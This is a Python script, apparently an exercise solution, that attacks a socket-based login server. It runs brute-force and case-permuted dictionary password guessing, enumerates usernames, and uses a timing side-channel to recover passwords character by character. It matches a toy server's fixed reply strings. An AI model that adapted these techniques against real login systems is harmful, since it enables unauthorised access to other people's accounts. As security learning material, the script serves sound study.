import json
import socket
import string
import time
from argparse import ArgumentParser
from itertools import product
from os import getcwd

THRESHOLD_RESPONSE = 0.1


def parse_cli_arguments():
    parser = ArgumentParser(description="This program establishes a connection to a website")
    parser.add_argument("ip_address")
    parser.add_argument("port")
    args = parser.parse_args()
    return args.ip_address, int(args.port)


def send_request(client, request):
    client.send(request.encode('utf-8'))


def receive_response(client, buffer_size=1024):
    return client.recv(buffer_size).decode('utf-8')


def print_password(password, response):
    if response == 'Connection success!':
        print(password)
        return True
    else:
        return False


def brute_force_password_generator_impl():
    symbols = string.ascii_lowercase + string.digits
    for rep in range(1, len(symbols)):
        for pw in product(symbols, repeat=rep):
            yield ''.join(pw)


def dictionary_password_generator_impl():
    working_directory = getcwd()
    with open("/".join([working_directory, "passwords.txt"]), "r") as passwords:
        for password in passwords:
            password = password.strip('\n')
            cases = zip(*[password, password.swapcase()])
            permutations = set(["".join(permutation) for permutation in product(*cases)])
            for permutation in permutations:
                yield permutation


def brute_force_password_generator(client):
    pw_gen = brute_force_password_generator_impl()
    while True:
        password = next(pw_gen)
        send_request(client, password)
        response = receive_response(client)
        if print_password(password, response):
            break


def dictionary_password_generator(client):
    pw_gen = dictionary_password_generator_impl()
    while True:
        password = next(pw_gen)
        send_request(client, password)
        response = receive_response(client)
        if print_password(password, response):
            break


def exception_password_generator(client):
    symbols = string.ascii_lowercase + string.ascii_uppercase + string.digits
    working_directory = getcwd()
    with open("/".join([working_directory, "logins.txt"]), "r") as logins:
        # iterate over all logins
        for login in logins:
            # make a json request with a dummy password
            login = login.strip('\n')
            request = {'login': login, 'password': ''}
            send_request(client, json.dumps(request))
            response = json.loads(receive_response(client))

            # check response
            if response['result'] == 'Wrong login!':
                continue
            elif response['result'] == 'Bad request!':
                print(json.dumps(request))
                return
            else:
                while response['result'] != 'Connection success!':
                    for symbol in symbols:
                        old_pw = request['password']
                        request['password'] = ''.join([request['password'], symbol])
                        send_request(client, json.dumps(request))

                        start = time.perf_counter()
                        response = json.loads(receive_response(client))
                        end = time.perf_counter()
                        duration = end - start

                        if response['result'] == 'Wrong password!':
                            if duration < THRESHOLD_RESPONSE:
                                request['password'] = old_pw
                            else:
                                break
                        elif response['result'] == 'Connection success!':
                            print(json.dumps(request))
                            return


password_generators = {
    'brute_force': brute_force_password_generator,
    'dictionary': dictionary_password_generator,
    'exception': exception_password_generator}


def main():
    ip_address, port = parse_cli_arguments()
    with socket.socket() as client:
        client.connect((ip_address, port))
        password_generators['exception'](client)


main()
